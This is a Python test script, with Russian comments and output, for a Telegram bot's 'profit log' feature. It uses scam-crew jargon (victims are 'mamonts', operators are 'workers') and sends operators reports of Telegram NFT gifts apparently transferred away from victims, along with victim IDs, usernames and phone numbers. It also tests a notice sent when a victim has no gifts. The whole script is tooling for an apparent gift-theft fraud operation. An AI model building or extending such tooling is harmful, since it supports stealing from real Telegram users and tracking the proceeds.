#!/usr/bin/env python3
"""
Скрипт для тестирования логов профитов
"""
import asyncio
import sys
import os
from datetime import datetime

# Добавляем путь к текущей директории для импорта модулей
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Импортируем нужные функции
try:
    from utils import send_profit_log, send_no_gifts_notification, get_phone_from_json, init_user_record
    from config import Config
    print("✅ Модули успешно импортированы")
except ImportError as e:
    print(f"❌ Ошибка импорта: {e}")
    print("⚠️ Убедитесь, что вы находитесь в правильной директории")
    sys.exit(1)

async def test_profit_log():
    """Тестирует отправку лога профита"""
    print("🧪 Тестирование лога профита")
    print("=" * 50)
    
    # Тестовые данные
    test_worker_info = {
        'telegram_id': 123456789,
        'username': 'test_worker'
    }
    
    # Тестовые ссылки на подарки (реальные форматы)
    test_gift_links = [
        "https://t.me/nft/gift-SnoopDogg-281706",
        "https://t.me/nft/gift-BoredApe-123456",
        "https://t.me/nft/gift-CryptoPunk-789012",
        "https://t.me/nft/gift-MoonCat-345678",
    ]
    
    test_user_id = 987654321
    test_victim_username = "victim_user"
    
    print(f"📊 Тестовые данные:")
    print(f"👷 Воркер: @{test_worker_info.get('username')} (ID: {test_worker_info.get('telegram_id')})")
    print(f"👤 Мамонт: @{test_victim_username} (ID: {test_user_id})")
    print(f"🎁 Количество подарков: {len(test_gift_links)}")
    print(f"🔗 Пример ссылки: {test_gift_links[0]}")
    print()
    
    # Инициализируем запись пользователя (для функции get_phone_from_json)
    print("📝 Инициализация записи пользователя...")
    init_user_record(test_user_id)
    
    print("🚀 Отправляем лог профита...")
    try:
        await send_profit_log(
            worker_info=test_worker_info,
            transferred_gift_links=test_gift_links,
            user_id=test_user_id,
            victim_username=test_victim_username
        )
        print("✅ Лог профита успешно отправлен!")
    except Exception as e:
        print(f"❌ Ошибка при отправке лога профита: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "=" * 50)

async def test_no_gifts_notification():
    """Тестирует уведомление об отсутствии подарков"""
    print("🧪 Тестирование уведомления об отсутствии подарков")
    print("=" * 50)
    
    test_user_id = 111222333
    test_phone = "+79991234567"
    test_gifts_count = 0
    
    print(f"📊 Тестовые данные:")
    print(f"👤 Пользователь ID: {test_user_id}")
    print(f"📞 Телефон: {test_phone}")
    print(f"🎁 Подарки: {test_gifts_count} (нет подарков)")
    print()
    
    print("🚀 Отправляем уведомление об отсутствии подарков...")
    try:
        await send_no_gifts_notification(
            user_id=test_user_id,
            phone=test_phone,
            gifts_count=test_gifts_count
        )
        print("✅ Уведомление успешно отправлено!")
    except Exception as e:
        print(f"❌ Ошибка при отправке уведомления: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "=" * 50)

async def test_profit_with_different_data():
    """Тестирует лог профита с разными данными"""
    print("🧪 Тестирование с разными вариантами данных")
    print("=" * 50)
    
    test_cases = [
        {
            'name': 'Стандартный случай',
            'worker': {'telegram_id': 1001, 'username': 'worker1'},
            'gifts': ["https://t.me/nft/gift-TestNFT-001", "https://t.me/nft/gift-TestNFT-002"],
            'user_id': 2001,
            'victim_username': 'victim1'
        },
        {
            'name': 'Без юзернейма мамонта',
            'worker': {'telegram_id': 1002, 'username': 'worker2'},
            'gifts': ["https://t.me/nft/gift-TestNFT-003"],
            'user_id': 2002,
            'victim_username': None
        },
        {
            'name': 'Без юзернейма воркера',
            'worker': {'telegram_id': 1003},
            'gifts': ["https://t.me/nft/gift-TestNFT-004", "https://t.me/nft/gift-TestNFT-005", "https://t.me/nft/gift-TestNFT-006"],
            'user_id': 2003,
            'victim_username': 'victim3'
        },
        {
            'name': 'Много подарков',
            'worker': {'telegram_id': 1004, 'username': 'worker4'},
            'gifts': [f"https://t.me/nft/gift-NFT-{i:03d}" for i in range(1, 11)],
            'user_id': 2004,
            'victim_username': 'victim4'
        },
        {
            'name': 'Особые символы в имени',
            'worker': {'telegram_id': 1005, 'username': 'worker_username'},
            'gifts': ["https://t.me/nft/gift-NFT_with_underscore-123", "https://t.me/nft/gift-NFT-with-dash-456"],
            'user_id': 2005,
            'victim_username': 'victim_user-name'
        }
    ]
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\n📋 Тест {i}: {test_case['name']}")
        print(f"   👷 Воркер: {test_case['worker']}")
        print(f"   🎁 Подарков: {len(test_case['gifts'])}")
        print(f"   👤 Мамонт: {test_case['victim_username'] or 'Не указан'}")
        
        try:
            await send_profit_log(
                worker_info=test_case['worker'],
                transferred_gift_links=test_case['gifts'],
                user_id=test_case['user_id'],
                victim_username=test_case['victim_username']
            )
            print(f"   ✅ Успешно отправлен")
        except Exception as e:
            print(f"   ❌ Ошибка: {e}")
        
        # Пауза между тестами
        await asyncio.sleep(1)
    
    print("\n" + "=" * 50)

async def test_specific_profit_log():
    """Тестирует конкретный лог профита с кастомными данными"""
    print("🎯 Тестирование конкретного лога профита")
    print("=" * 50)
    
    print("Введите данные для теста:")
    
    try:
        # Ввод данных
        worker_username = input("Имя воркера (без @): ").strip() or "test_worker"
        worker_id = input("ID воркера (число): ").strip() or "999888777"
        
        victim_username = input("Имя мамонта (без @, оставьте пустым если нет): ").strip()
        victim_username = victim_username if victim_username else None
        
        user_id = input("ID пользователя (число): ").strip() or "111222333"
        
        # Генерация ссылок на подарки
        print("\n🎁 Генерация ссылок на подарки...")
        gift_links = []
        num_gifts = input("Сколько подарков сгенерировать? (по умолч. 3): ").strip()
        num_gifts = int(num_gifts) if num_gifts.isdigit() else 3
        
        for i in range(num_gifts):
            gift_name = input(f"Имя NFT {i+1} (например, CryptoPunk): ").strip() or f"TestNFT{i+1}"
            gift_id = input(f"ID NFT {i+1} (число): ").strip() or f"{1000+i}"
            link = f"https://t.me/nft/gift-{gift_name}-{gift_id}"
            gift_links.append(link)
            print(f"   ✅ Добавлен: {link}")
        
        # Подготовка данных
        worker_info = {
            'telegram_id': int(worker_id) if worker_id.isdigit() else 999888777,
            'username': worker_username
        }
        
        user_id_int = int(user_id) if user_id.isdigit() else 111222333
        
        print(f"\n📊 Итоговые данные для теста:")
        print(f"👷 Воркер: @{worker_info['username']} (ID: {worker_info['telegram_id']})")
        print(f"👤 Мамонт: @{victim_username or 'Неизвестно'} (ID: {user_id_int})")
        print(f"🎁 Подарков: {len(gift_links)}")
        
        confirm = input("\nПодтвердить отправку? (y/N): ").strip().lower()
        
        if confirm == 'y':
            print("\n🚀 Отправляем лог профита...")
            await send_profit_log(
                worker_info=worker_info,
                transferred_gift_links=gift_links,
                user_id=user_id_int,
                victim_username=victim_username
            )
            print("✅ Лог профита успешно отправлен!")
        else:
            print("❌ Отправка отменена")
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "=" * 50)

def print_topic_info():
    """Выводит информацию о топиках"""
    try:
        print("\n📌 ИНФОРМАЦИЯ О ТОПИКАХ:")
        print("=" * 40)
        print(f"📊 ID чата для логов: {Config.LOG_CHAT_ID}")
        print(f"💰 Топик профитов (Profits): {Config.TOPIC_PROFITS}")
        print("=" * 40)
        print(f"⚠️ Убедитесь, что бот имеет доступ к топику {Config.TOPIC_PROFITS}")
        print("=" * 40)
    except Exception as e:
        print(f"⚠️ Ошибка при получении информации о топиках: {e}")

async def main():
    """Основная функция"""
    print("=" * 50)
    print("🔧 ТЕСТИРОВАНИЕ ЛОГОВ ПРОФИТОВ")
    print("=" * 50)
    
    # Показываем информацию о топиках
    print_topic_info()
    
    # Выбор режима тестирования
    print("\n📝 РЕЖИМЫ ТЕСТИРОВАНИЯ:")
    print("1. 🧪 Тест лога профита (стандартный)")
    print("2. 📭 Тест уведомления об отсутствии подарков")
    print("3. 🔄 Тест с разными вариантами данных")
    print("4. 🎯 Тест с кастомными данными")
    print("5. 📋 Все тесты последовательно")
    print("0. ❌ Выход")
    
    choice = input("\nВыберите режим (0-5): ").strip()
    
    try:
        if choice == '0':
            print("👋 Выход...")
            return
        
        elif choice == '1':
            print("\n🚀 Запуск теста лога профита...")
            await test_profit_log()
        
        elif choice == '2':
            print("\n🚀 Запуск теста уведомления об отсутствии подарков...")
            await test_no_gifts_notification()
        
        elif choice == '3':
            print("\n🚀 Запуск теста с разными вариантами данных...")
            await test_profit_with_different_data()
        
        elif choice == '4':
            print("\n🚀 Запуск теста с кастомными данными...")
            await test_specific_profit_log()
        
        elif choice == '5':
            print("\n🚀 Запуск всех тестов последовательно...")
            await test_profit_log()
            await asyncio.sleep(2)
            await test_no_gifts_notification()
            await asyncio.sleep(2)
            await test_profit_with_different_data()
        
        else:
            print("❌ Неверный выбор!")
            return
        
        print("\n" + "=" * 50)
        print("✅ Тестирование завершено успешно!")
        print(f"⏰ Время завершения: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
    except KeyboardInterrupt:
        print("\n\n⏹️ Тестирование прервано пользователем")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Проверяем наличие необходимых переменных окружения
    try:
        print("🔍 Проверка конфигурации...")
        print(f"✅ BOT_TOKEN: {'Установлен' if hasattr(Config, 'BOT_TOKEN') and Config.BOT_TOKEN else 'Отсутствует'}")
        print(f"✅ LOG_CHAT_ID: {getattr(Config, 'LOG_CHAT_ID', 'Не установлен')}")
        print(f"✅ TOPIC_PROFITS: {getattr(Config, 'TOPIC_PROFITS', 'Не установлен')}")
    except Exception as e:
        print(f"⚠️ Ошибка при проверке конфигурации: {e}")
    
    # Запускаем асинхронную функцию
    asyncio.run(main())